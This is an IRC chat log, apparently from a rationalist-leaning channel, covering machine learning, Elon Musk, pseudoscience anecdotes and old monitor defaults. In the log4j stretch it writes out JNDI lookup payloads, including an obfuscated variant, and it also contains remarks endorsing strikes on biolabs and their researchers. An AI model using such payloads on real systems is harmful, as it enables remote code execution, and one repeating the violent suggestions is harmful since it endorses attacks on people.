[01:03:59] <RiversHaveWings> gwern: yeah it's p common to, if you need to output positive values from a neural net, with a large dynamic range, to just parameterize it as the log of the value, this generally works fine
[01:04:24] <RiversHaveWings> like a common one i do is outputting a Gaussian parameterized w/ mean and log variance
[01:04:41] <RiversHaveWings> since variance must be positive
[01:04:44] <gwern> RiversHaveWings: but only the last layer, no? he's talking about the entire net, which will need different activations etc. and cannell has a very galaxybrain interpretation of this as being more equivalent to solomoff inference in aixi
[01:05:43] <RiversHaveWings> gwern: well if additive and multiplicative activation functions are so similar, then you can just exponentiate some outputs of the net and not others, they mix just fine
[01:06:12] <gwern> apparently they have very different convergence speeds
[01:06:33] <RiversHaveWings> really?
[01:06:46] <gwern> 'Has this been tried/evaluated? Why actually yes it's called exponentiated gradient descent, as exponentiating the result of additive updates is equivalent to multiplicative updates.

[05:37:31] <catern> unrelatedly, ugh people are bullying me on the internet why are they being so mean to me :((((

[07:24:35] <kiboneu> can someone please explain to me why some people _vehemently_ dislike elon musk? like I understand liking or disliking someone to a mild level, especially someone who mostly exists on TV / internet and has as much economic impact as a lot of people with reasons to like/dislike
[07:25:42] <kiboneu> but it seems like some people have ethical / moral / good-for-the-world-if-he-dissappears "awful person // send him to mars so he never comes back!" statements
[07:25:50] <feep> the more power someone has, the more people try to exert social conformance on them
[07:26:15] <feep> this makes sense in small tribal groups but not so much on our scale, because people can't actually influence musk's behavior by being angry at him
[07:26:23] <feep> but the instinct happens anyway
[07:26:27] <feep> (that's my theory at least)
[07:26:54] <kiboneu> The most I got tonight was "he made a bunch of money out of paypal which is bs" and "he shouldn't be the one to win mars"
[07:27:12] <gwern> kiboneu: 'behind every great fortune lies a great crime'. this is the core axiom of blankslatism. the higher musk rises, the more he *must* be exploiting, grifting, cheating, lying, stealing - this is why the emerald thing is such a meme among leftists
[07:27:59] <kiboneu> Ah, ok
[07:28:19] <gwern> it's like the 'musk is bad because he uses stuff like carbon credits'
[07:28:40] <kiboneu> I noticed a bit of a meme of "he's successful, he sploited his way to the top like the rest of them" smelling around the internet for a while
[07:28:45] <gwern> which is like... what, you don't want california's emissions credits being used? that's not a success? maybe think that through a little more
[07:28:54] <kiboneu> (generic meme, not just with musk)
[07:29:33] <kiboneu> right
[07:29:48] <ggreer> what can they even get him with? he doesn't live a lavish lifestyle. the dude lives in a $50k trailer which he rents. he doesn't own a single home. he doesn't own any pleasure yachts or anything
[07:30:01] <ggreer> he's rich because he created ridiculously successful companies
[07:30:12] <feep> this assumes more requirement for correctness than is evident
[07:30:14] <kiboneu> it's like, he made money through paypal, there are more violent ways to make money i guess and at the end people usually aren't forced to use it
[07:30:36] <kiboneu> and used his roth ira and hsa or whatever
[07:30:44] *** Quits: voltage_ (voltage@user/voltage) (Quit: Leaving)
[07:30:51] <kiboneu> ok so this is part of the same meme
[07:31:07] <gwern> I haven't heard that musk used the roth ira trick
[07:31:25] <kiboneu> oh maybe that was thiel
[07:31:26] <gwern> he wouldn't be paying all those taxes if it was all inside a roth
[07:31:29] <kiboneu> yeah
[07:31:42] <gwern> yeah, it's thiel. by the time musk came on board, it was too late for him to use the trick
[07:31:55] <kiboneu> late, age-wise?
[07:32:32] <rmmh> "The cream cheese shortage wreaking havoc on bagel shops is, in part, due to a cyberattack on the biggest U.S. cheese manufacturer" 
[07:32:54] <gwern> kiboneu: no, legally
[07:33:49] <gwern> he didn't put the shares of his original company merging with paypal into a roth. by the time they merged and presumably he learned of the trick, it was too late to put most of his shares into it. he could've put $5k into it and it'd still be a good idea, but it wouldn't be like thiel's billions
[07:34:15] <kiboneu> ah gotcha
[07:34:34] <gwern> anyway, musk's basic crime is to be successful, and then all the other stuff like the widespread admiration or his refusal to repent for his sins and accept the salvation of wokism, is merely salt into the wound
[07:35:01] <ggreer> sad how so many people are ganging up on this successful african american
[07:35:28] <gwern> that he does much of this while 'pretending' to be green is a major factor. it's the narcissism of small differences. leftists can hate musk in a way that they can't some random Koch brother, because Musk is ingroupy and yet, a traitor
[07:35:40] <feep> don't you know, blackness isn't about skin color
[07:35:47] <kiboneu> it was a bit dissapointing that people I was becoming friends with were repeating the same memes
[07:36:00] <kiboneu> but what can you do
[07:36:07] <kiboneu> common experience outside of #lesswrong
[07:36:15] <kiboneu> they have other great qualities
[07:36:37] <kiboneu> i have my own skeletons in the closet anyway
[07:36:38] <feep> people repeat memes.
[07:36:52] <feep> I repeat memes, you repeat memes, we all repeat memes
[07:36:56] <kiboneu> yeah
[07:37:05] <kiboneu> i just try to bias the meme curve

[07:44:33] <PlanckWalk> Paypal is bad and Musk shoudl feel bad.  But not as bad as, say, Nestle.

[07:46:53] <PlanckWalk> Maybe it's because Musk tweets stuff that people dislike, but unlike the other millions of people who tweet exactly the same stuff, Musk can *actually do it*.
[07:48:21] <PlanckWalk> There might be some theory about being able to target the Internet Hate Machine onto him to financially pressure his companies so he doesn't do it (for whatever value of "it" is out of favour)
[07:48:51] <gwern> where there is blood, the bloodsuckers gather. where there is money...
[07:49:18] <gwern> so sad that he doesn't have a wife who can 'melinda' or 'mackenzie' him
[07:49:51] <kiboneu> oh yeah didn't bill gates almost get mackenzied?
[07:50:07] <kiboneu> man all this stuff
[07:50:25] <kiboneu> who actually cares? apparently, for a lot of people it's as simple as being told to care
[07:51:23] <kiboneu> ads and pr firms taught me that
[07:51:29] <gwern> it's unclear how much bill is losing. it's worth noting that bill married her well after he was seriously rich, in 1994, so you have to assume the prenup is *ironclad*
[07:51:34] <PlanckWalk> I mostly read the Internet to see if the garbage wildfire is approaching anything I care about.
[07:52:16] <kiboneu> yeah, sorry i was thinking of epstein not mackenzie but i get your point after ECCing
[07:52:28] <gwern> I expect there were fraught negotiations, where Bill pointed to the ironclad prenup, and melinda pointed to embarassment over epstein and all the dirt she can come up with
[07:52:44] <gwern> so she would get assigned much less than 50% but much more than 0%
[07:53:40] <gwern> anyway, musk is yet again single, so no issue there
[07:53:43] <kiboneu> i should make an ironclad prenup
[07:54:32] <kiboneu> oh man no more grimes huh?
[07:54:55] <gwern> he never married her, and commonlaw wife would be hard to make stick

[08:49:00] <quanticle> Maybe India
[08:49:29] <shawwwn> india might be a risky decision if a political revolution was happening
[08:49:33] <kiboneu> i'll just go to as remote as a place as possible and live the rest of life like minecraft
[08:49:33] <quanticle> But let's be real, India is more likely to go fascist than we are
[08:50:34] <shawwwn> revolution is also opportunity
[08:51:05] <kiboneu> yeah i know people who went to the soviet union right after its collapse
[08:51:09] <kiboneu> to collect research
[08:51:36] <shawwwn> what did they find?
[08:51:37] <kiboneu> good trick, will keep that in mind and position my tendrils in the meantime
[08:52:30] <quanticle> kiboneu: Oh yeah, from about 1990 to 1995 was a golden age if you wanted to research stuff like the Eastern Front in World War 2.
[08:52:36] <quanticle> Or the Soviet effort in Afghanistan
[08:52:43] <quanticle> A lot of archives were wide open
[08:52:47] <quanticle> And then they were shut by Putin
[08:52:51] <kiboneu> shawwwn: a lot of weird fringe shit
[08:53:07] <kiboneu> i.e. some material on the yusmar
[08:53:40] <kiboneu> https://earthtech.org/yusmar-potapov-device/
[08:53:42] <Robomot> YUSMAR - Potapov Device - EarthTech
[08:54:08] <shawwwn> https://earthtech.org/yusmar-potapov-device/ ?
[08:54:12] <feepbot> YUSMAR - Potapov Device - EarthTech
[08:54:13] <shawwwn> aha
[08:54:51] <kiboneu> (a real yusmar generator lives in the empire state building for heating purposes, but the inventor claimed that it could generate more energy than the energy given to it)
[08:54:58] <shawwwn> your friends sound interesting
[08:55:29] <kiboneu> (he was given 1 week to prove it to los alamos national labs)
[08:55:49] <shawwwn> narrator: he couldn't
[08:56:36] <kiboneu> tbh, i don't think he was given a fair chance
[08:58:07] <kiboneu> anyway. said friend went on with arthur c clarke to try to fund research into it
[08:58:31] <kiboneu> now there aren't too many of them left what can i say
[08:58:47] <shawwwn> it is sort of an interesting question. suppose you discovered a device that could beat the conservation of energy. How would you prove it to the world? No one would take you seriously
[08:58:57] <shawwwn> you'd have to commercialize it
[08:58:58] <Obormot\Arcturus> The best way to survive a revolution is to be very far away from it
[08:59:23] <shawwwn> but then you'd just lose your invention to someone who made it better and cheaper
[08:59:58] <Obormot\Arcturus> Just be as far from any revolutionary bullshit going on as possible
[09:00:34] <Obormot\Arcturus> Different country is good, different continent is ideal... somewhere out in the boondocks might work in a pinch...
[09:01:04] <kiboneu> shawwwn: it wasn't really beating it. you see he believed that the chamber vibrated in just the right way to produce cavitation bubbles in the water
[09:01:05] <shawwwn> apple could make one and call it the newton just to be ironic
[09:01:36] <rmmh> shawwwn: lug it to the caltech lawn and nerdsnipe passing physicists
[09:01:41] <kiboneu> the bubbles would emit a lot of heat in addition to the pressure-increase-based mechanics in play in the yusmar
[09:02:02] <shawwwn> rmmh: there's a passage in Feynman's Rainbow about that. Apparently they get a lot of loons showing up
[09:02:20] <shawwwn> so it's not an uncommon strategy
[09:02:22] <kiboneu> and i don't think it's clear why cavitation bubbles form, yet
[09:02:57] <kiboneu> rmmh: lol
[09:03:00] <shawwwn> kiboneu: I want your friends
[09:04:46] <kiboneu> said friend also talked about research from labs on exposing fungi and bacteria to various various acoustic and em energies and how they affected their growing patterns
[09:05:31] <kiboneu> he mentioned an experiment that seemed to show horizontal gene transfer between organisms between two physically but not EM or acoustically isolated chambers
[09:05:51] <shawwwn> between fungi?
[09:06:34] <kiboneu> actually now that i'm remembering more clearly it was between viruses
[09:06:46] <kiboneu> viral colonies isolated in different chambers
[09:07:09] <nshepperd2> i always suspected that viruses were actually just bill gates microchips
[09:07:17] <kiboneu> lol
[09:09:55] <kiboneu> he had a lab and everything
[09:10:05] <kiboneu> i visited it a few times when i was younger
[09:10:15] <feep> to me this is more like "control group for science" territory
[09:10:37] <kiboneu> his now ex-wife left him and took it, so now he isn't doing any research unfortunately
[09:10:45] <feep> the fancy trick is less the gene transfer and more the ability to find evidence for it even in the face of transparent absurdity
[09:10:56] <feep> wait, his wife took the *lab* in the divorce?
[09:11:02] <kiboneu> it was under her name
[09:11:07] <kiboneu> he was too trusting
[09:11:08] <nshepperd2> lol
[09:11:09] <feep> I mean like. 
[09:11:20] <feep> "You can have the dog and the kids, I'm keeping the centrifuge"
[09:11:26] <kiboneu> lmao

[09:11:33] <nshepperd2> what is she going to do with a pseudoscience lab
[09:11:39] <kiboneu> i guess its the centrifuge
[09:11:44] <feep> .... there is a really obvious answer there
[09:12:08] <kiboneu> nshepperd2: i think she ended up not being able to pay rent on it and lose it
[09:12:18] <nshepperd2> lmao
[09:12:20] <feep> shoulda done more pseudoscience
[09:14:00] <kiboneu> they were still using the same email account for a while so he'd get emails from her friends, at one point finding out that she was going to an abandoned looking shed at the end of a road somewhere and going to a psychiaratrist specializing in rehab and crystal healing
[09:14:22] <feep> okay
[09:14:30] <feep> maybe actually shoulda done less pseudoscience
[09:15:33] <nshepperd2> > rehab and crystal healing
[09:15:56] <kiboneu> her website has a video of her dancing in spandex with wavy flag things
[09:16:02] <nshepperd2> when you've been using the wrong kind of crystals
[09:16:08] <kiboneu> haha yeah
[09:17:31] <kiboneu> it's not the first time i've heard of a multi-decade marriage ending like that from someone whos close
[09:17:55] <kiboneu> it's kind of nuts, being married for a few decades and then that... level of trust being breached
[09:18:05] <kiboneu> to the extent of stealing assets and leaving you to rot
[09:18:12] <kiboneu> and weaving stories
[09:19:04] <kiboneu> Can that kind of extreme deviate of behavior really come from inside of people? I guess so... the toxo, you know
[09:19:38] <shawwwn> people underestimate how much a person can change over a decade
[09:20:26] <kiboneu> but then there's the toxo of ideas and forces trying to brainwash people, either selectively and targeted to them or just a sweep of memes getting dispersed and sticking onto some people
[09:20:27] <shawwwn> also can I get her number from you?
[09:21:46] <kiboneu> no
[09:22:25] <kiboneu> shawwwn: i mean, over a decade

[10:26:32] <feepbot> <gwern> 'One of the most important lessons about mass-use computer tools is that overwhelmingly people use defaults. I first realised this back in the 1990s when shitty default monitor resolution and refresh rate would literally inflict pain (headaches and eyestrain). MS Windows 95 / 98 shipped with a default of 800x600@60Hz. This was on CRTs, many viewed under office flourescent
[10:26:32] <feepbot> lighting, which gave rise to a bloody awful flicker that people mistakenly attemtped to correct with "glare screens" and other useless crud. The solution was simply to crank up refresh rate slightly. Bumping up resolution also gave more useful area and clearer, easier-to-read fonts. (This was also before Cleartype / sub-pixel rendering.) And yet something like 90-95% of systems
[10:26:32] <feepbot> monitored ... somehow (possibly an early Web tool) revealed 800x600, and I believe 60 Hz refresh. This on systems which could easily be bumped to 1024x768 or better. And this was literally a click away off the desktop. Lesson Younger Me learned: users won't change any default. So: Pick really good defaults. Autoconfigure for best experience if possible. If you want to cram things
[10:26:37] <feepbot> down users' throats, you can just change the default experience, especially on a SAAS app.' https://news.ycombinator.com/item?id=29574659
[10:26:37] <Robomot> One of the most important lessons about mass-use computer tools is that overwhel... | Hacker News
[10:31:43] <ggreer> back then monitors didn't have reliable ways to tell the OS what resolutions and refresh rates they supported. 800x600@60hz was a resolution that almost all monitors supported
[10:32:37] <ggreer> had they defaulted to 1024x768@72Hz, a decent fraction of people would upgrade to windows 95/98 and suddenly their monitor wouldn't show anything
[10:35:55] <quanticle> And with regards to refresh rates, if you set the PCs refresh rate higher than the monitor, you'd the crappy VCR artifact
[10:36:23] <quanticle> Where the image constantly moves up or down at the beat frequency between the monitor's refresh rate and the computer's signal
[10:37:09] <quanticle> I miss a few things from the old days of computing, but having to mess around with CRT monitor settings is not one of them
[10:38:14] <quanticle> Remember having to manually fiddle with the trapezoid settings in order to get straight lines to be straight?
[10:45:26] <saturn2> i'm pretty sure 95/98 defaulted to 640x480, it wasn't until windows xp that 800x600 became safe enough
[10:47:00] <quanticle> I thought XP defaulted to 1024x768
[10:47:55] <saturn2> but the main point is that most people would rather suffer with a headache than configure a setting
[10:48:53] <ggreer> google says that 95's default was 800x600
[10:49:00] <ggreer> 640x480 was setup and safe mode

[19:21:45] <feepbot> Saturn [saÀêÀàt ärn äs]) was a god in ancient Roman religion, and a character in Roman mythology. He was described as a god of generation, dissolution, plenty, wealth, agriculture, periodic renewal and liberation.

[20:12:21] <PapuaHardyNet> you know, there's been at least one log4j related post on HN for days
[20:12:50] <kuudes> ${jndi:ldap://1.2.3.4/exploit.jar} boom the machine that reads this is rooted
[20:14:33] <PapuaHardyNet> very well, it is scary. But this is overblown because this affects corporations a lot
[20:14:46] <kuudes> huh?
[20:14:51] <gwern> I thought it was because half the planet runs java shit

[20:15:51] <PapuaHardyNet> huh. I see. any application that is java based and is exposed to the internet has this issue?
[20:16:01] <kuudes> it does not need to be exposed to internet
[20:16:06] <PapuaHardyNet> oh yeah, sorry
[20:16:19] <kuudes> it just has to log user inputable strings
[20:16:33] <PapuaHardyNet> rooted means has access to a shell, right? this is an RCE, that's all

[20:16:52] <PapuaHardyNet> if the application isn't run with root then it isn't as scary as you make it seem
[20:16:53] <kuudes> rooted means owning access
[20:17:15] <kuudes> usually syslog or something finally is run as root
[20:17:20] <PapuaHardyNet> come on, you are telling me it gets root access regardless of whether the application itself is run in root or not? that's crazy
[20:17:22] <nshepperd> rooted normally means having root access
[20:17:43] <two2thehead> "So log4j is a very commonly used logging library in the Java programming language. Programmers use this to help indicate the state of various parts of their program.
[20:17:43] <two2thehead> "Generally speaking, when processing inputs from the user, you always want to treat the input as just normal text, and not code that the program should execute. You do this due to the fact that if an attacker can inject their own code into a program, their possibilities are endless for hacks/breaches. Now unfortunately if you construct a specific string of text, and are able to get the log4j library to log that string(which is pretty trivial because 
[20:17:43] <two2thehead> most programs will log user inputs), you are able to get the log4j library to reach out to other servers and execute any code that is returned."
[20:17:44] <nshepperd> i assume this is just an rce
[20:17:48] <kuudes> there are X amount of sploits where a local user can gain unallowed root access
[20:18:04] <kuudes> the point is that jars can contain jars that contain jars
[20:18:19] <kuudes> you never know what is inside your spring thingy until you check
[20:18:31] <two2thehead> Finally read up on this. So basically an input sanitation problem that results in remote code execution
[20:18:40] <PapuaHardyNet> so it is just an RCE, that's all right
[20:18:49] <PapuaHardyNet> I hope people stop using Java
[20:18:49] <kuudes> no one knew logger input would need to be sanitised
[20:18:58] <kuudes> it is supposed to just be written to a file, nothing more
[20:19:10] <two2thehead> PapuaHardyNet, I'm not sure. Please don't take my opinion as gospel
[20:19:37] <nshepperd> i don't think 'sanitization' would be the answer here
[20:19:39] *** Joins: adiabatic (~adiabatic@user/adiabatic)
[20:19:54] <kuudes> rce inside your bank's db is not a nice thing
[20:20:32] <kuudes> send money with message ${jdni:ldap://server/exploit} to find out more
[20:20:41] <PapuaHardyNet> let's be honest, (1) all user input should be sanitized no matter what, and (2) we should expect loggers to think input is sanitized
[20:20:42] <two2thehead> nshepperd, i'm open to better explanations
[20:20:49] <kuudes> send a sms to root the base stations your message runs on
[20:21:20] <kuudes> 2 was expected, but was untrue
[20:21:35] <gwern> 'sanitized' with respect to what? how should the rest of the app know what the logger needs?
[20:22:17] <PapuaHardyNet> good question, I did not think of that - even plain text with no symbols can be a command
[20:22:22] <kuudes> send an email to root all servers that pass it on
[20:22:39] <kuudes> and this is on ascii
[20:22:42] <Gurkenglas> send an ip packet no root all routers that pass it on
[20:22:48] <Gurkenglas> s/no/to/
[20:22:52] <nshepperd> by the looks of it this is basically a printf(user_controlled_string) issue
[20:22:59] <kuudes> yes
[20:23:15] <kuudes> but for some reason the printf has internally built internet connectivity
[20:23:21] <kuudes> to get code to run locall
[20:23:22] <kuudes> y
[20:23:44] <nshepperd> The answer is not sanitization it is printf("%s", string)
[20:24:17] <kuudes> yes but you printf still in this case reads the thing inside the string and decides that that was not what you wanted
[20:25:17] <nshepperd> that would be the library being wrong and bad
[20:25:20] <kuudes> yes
[20:25:49] <kuudes> no worry, there is an updated version of library which does not do that
[20:26:04] <kuudes> just find all million different instances on your machines that run the library and replace them
[20:26:18] <kuudes> also inside jars which have been signed by developer, so you can't validate them anymore
[20:26:37] <kuudes> jar is a zip, so it can contain new jars, which can contain new jars
[20:27:07] <kuudes> standalone java applications are often jars which contain jars
[20:27:20] <two2thehead> nshepperd, kuudes Hmm interesting (.__.)?
[20:27:36] <Gurkenglas> update java to automatically replace executions calls to the vulnerable function with calls to a fixed one? x)
[20:27:54] <kuudes> sometimes it is a combination, so you can have artefactory which gives you jars but sometimes your jars decide to use some other jars instead
[20:28:01] <kuudes> Gurkenglas, there are such approaches
[20:28:02] <PapuaHardyNet> update java? people don't update java, they avoid it as much as humanly possible
[20:28:49] <kuudes> and the point is that because this runs inside ascii data, it gets through by normal allowed user queries
[20:29:04] <kuudes> so your firewall which blocks the legacy servers from outside world, does not matter
[20:29:08] <Gurkenglas> ${jdni:ldap://8.8.8.8/updatejdnildap.jar}
[20:29:32] <PapuaHardyNet> oh wait, that makes perfect sense
[20:29:44] <PapuaHardyNet> use this RCE to force update everyone to use a version of java that patches this
[20:29:47] <kuudes> because the system will just pass the messages around and then something on the deepest level which is vulnerable because it can't be updated, is rooted, like a bank's account database server
[20:30:52] <PapuaHardyNet> oh wait, by java you meant the library instead of Java the language
[20:30:55] <PapuaHardyNet> disappointing
[20:31:00] <PapuaHardyNet> thing bigger, Gurkenglas
[20:31:57] <Gurkenglas> i thought i meant the language
[20:33:14] <PapuaHardyNet> I have an even better idea actually
[20:33:19] <kuudes> it takes one jvm environment setting/variable to disable it, so indeed it is possible to use the sploit to stop the sploit
[20:33:40] <two2thehead> kuudes, could be something a worm could fix
[20:34:45] <Betawolf> if you grep your server logs you'll probably see this exploit being attempted with various forms of obfuscation, it's being scanned constantly
[20:39:07] <PapuaHardyNet> Betawolf: they are simply assuming you are running a java app in the background that uses log4j or is there actual targetting going on?
[20:39:47] <Betawolf> I mean it's internet-wide scanning for this vulnerability. Doesn't take long. If you're vulnerable you'd see something additional, no doubt.
[20:40:39] <kuudes> you know there are distributed things that try every machine that responds to ssh query on 22 or 222 with random passwords?
[20:40:49] <kuudes> internet is dark forest
[20:41:36] <PapuaHardyNet> no, obviously I'm more naive than I though
[20:41:48] <kiboneu> anyone in nyc have a NeXTcube?
[20:42:09] <PapuaHardyNet> ask obormot
[20:42:16] <Betawolf> "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:/" is one I've seen a lot.

[21:56:41] <gwern> the mouse thing at least wouldn't be ccp. omicron isn't in china yet and we'd know if it had been there all along because it'd shred their current control system
[21:57:14] <gwern> but I definitely am wondering if a bunch of PDFs and databases are going to quietly go offline over the next week or so somewhere
[21:57:25] <two2thehead> kuudes, s0ph1a feep : I just want one (1) (uno) piece of good news about covid19, but that apparently is too much to ask
[21:59:39] <gwern> (if I were big into covid, I'd be coordinating with others making a list of institutes which could be responsible, dumping anythin and everything about the covid strains they were working with and anything mouse-related, and monitoring to see what disappears)
[22:00:11] <two2thehead> gwern, I took the link to mean that CCP extracted the virus from the bat mine, put it into mice hosts and did gain of function research, and it leaked into human hosts, which created this mess. ie I didn't mean *omicron variant itself* to be from the viral lab
[22:00:49] <gwern> oh. was wuhan using mouse models? there are others it could've used
[22:01:18] <two2thehead> no, no. I'm assuming this provides some very small evidence
[22:01:27] <two2thehead> if that makes sense?
[22:05:25] <ggreer> at this point it's probably moral from a utilitarian perspective to drop a tactical nuke on every BSL level 3+ lab in the world
[22:07:27] <two2thehead> I 'get' what your goal is, but it would be easier just to use conventional munitions and drones; both on labs and researchers

[23:53:52] <two2thehead> I finally read up on omicron
[23:54:15] <two2thehead> kuudes, consider this positive feedback on your prediction being potentially accurate
[23:54:40] <Guest87678> it sounds like necronomicon so I'm worried
[23:54:48] <kuudes> thanks. I would like to be alarmistic instead of correct
[23:55:02] <two2thehead> Guest87678, I see we are thinking along similar lines :V
[23:55:05] <two2thehead> kuudes, yep
[23:55:34] <kuudes> after yelling for this long, I was angered today but I guess relief is settling in and currently I am feeling sort of resigned and curious
[23:56:00] <kuudes> but yeah, get boosters, self isolate, wear masks
[23:56:10] <kuudes> ffp3s if possible
[23:56:20] <maplefinger> omicron seems less concerning than delta
[23:56:24] <spxtr> I thought omicron was mostly something to not worry about?
[23:56:35] <spxtr> as a vaccinated, boosted, 20something
[23:56:48] <kuudes> 2 doses protects against hospitalization 70%
[23:57:07] <kuudes> so for 3 unvaccinated persons 1 comparable vaccinated person ends to hospital
[23:57:21] <kuudes> with delta it was 14:1 or something
[23:57:32] <kuudes> booster is nice, takes things back to better
[23:57:37] <spxtr> but the base rate for healthy 20somethings ending up in the hospital is super low, though
[23:57:41] <spxtr> even unvaccinated
[23:57:51] <kuudes> ~ depends
[23:57:57] <kuudes> Obormot\Arcturus didn't end up to hospital
[23:58:28] <kuudes> have you recovered your sense of smell, may I ask, Obormot\Arcturus?
[23:58:51] <kuudes> point being, there are a lot of things that don't take you to hospital but lower your life satisfaction by plenty
[23:59:13] <kuudes> also, you don't want to break a leg when there are 300k other people trying to get into hospital
[23:59:19] <spxtr> sure, but wearing masks all the time and cancelling in-person gatherings and so on also lowers my life satisfaction
[23:59:20] <two2thehead> kuudes, s0ph1a feep : you know what this reminds me of? Remember that influenza death study I shared about a year and a half back? In it, they discovered that the *first* person in a household to get infected with influenza is *less* likely to die from it, compared to the *second* person in the *same* household. They apparently concluded that the first case was exposed only once, and thus had a lower rate of viral load, and he could easily recover 
[23:59:20] <two2thehead> from it. *But* the second person was repeatedly exposed to an infected person (the first person infected in the household), which increased his viral load which resulted in death. I suspect that this is also analogous.
